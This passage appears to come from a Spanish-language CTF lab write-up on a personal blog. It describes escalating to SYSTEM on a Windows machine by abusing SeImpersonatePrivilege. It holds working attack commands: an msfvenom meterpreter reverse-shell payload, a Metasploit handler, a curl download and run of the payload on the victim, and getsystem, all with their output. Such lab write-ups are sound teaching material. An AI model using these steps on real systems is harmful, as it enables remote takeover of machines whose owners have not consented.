+<li>Podemos abusar del <strong>SeImpersonatePrivilege</strong> usando el <a href="https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1">https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1</a> o con <strong>metasploit</strong> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato</a> .</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.1.127 LPORT=443 -f exe &gt; reverse_shell.exe
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ sudo msfconsole
+[sudo] password for miguel:
+Metasploit tip: Set the current module's RHOSTS with database values using
+hosts -R or services -R
+
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           https://metasploit.com
+
+
+       =[ metasploit v6.3.55-dev                          ]
++ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
++ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST 10.8.1.127
+LHOST =&gt; 10.8.1.127
+msf6 exploit(multi/handler) &gt; set LPORT 443
+LPORT =&gt; 443
+msf6 exploit(multi/handler) &gt; exploit
+
+[*] Started reverse TCP handler on 10.8.1.127:443
+</code></pre></div></div>
+<ul>
+<li>Después lo descargamos y lo ejecutamos en la máquina víctima.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Temp&gt; curl -o rev.exe http://10.8.1.127:8080/reverse_shell.exe
+curl -o rev.exe http://10.8.1.127:8080/reverse_shell.exe
+PS C:\Temp&gt; dir
+dir
+
+
+    Directory: C:\Temp
+
+
+Mode                 LastWriteTime         Length Name                                  
+----                 -------------         ------ ----                                                        
+-a----          3/1/2024   1:57 PM         153600 JuicyPotatoNG.exe                     
+-a----          3/1/2024   1:38 PM          28160 nc.exe                                
+-a----          3/1/2024   2:35 PM          73802 rev.exe                               
+
+
+PS C:\Temp&gt; .\rev.exe
+.\rev.exe
+PS C:\Temp&gt;
+</code></pre></div></div>
+<ul>
+<li>Y listo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">msf6 exploit(multi/handler) &gt; exploit
+
+[*] Started reverse TCP handler on 10.8.1.127:443
+[*] Sending stage (176198 bytes) to 10.10.111.108
+[*] Meterpreter session 1 opened (10.8.1.127:443 -&gt; 10.10.111.108:51168) at 2024-03-01 16:37:07 -0600
+
+meterpreter &gt; getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+meterpreter &gt;
+</code></pre></div></div>
+<ul>
+<li>Y listo.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/ooJo7Sd.png">
+</p>
+
+<h2 id="root-txt">Root.txt</h2>
+<ul>
+<li>Ahora vemos la flag.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/fObra6i.png">
+</p>
+
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
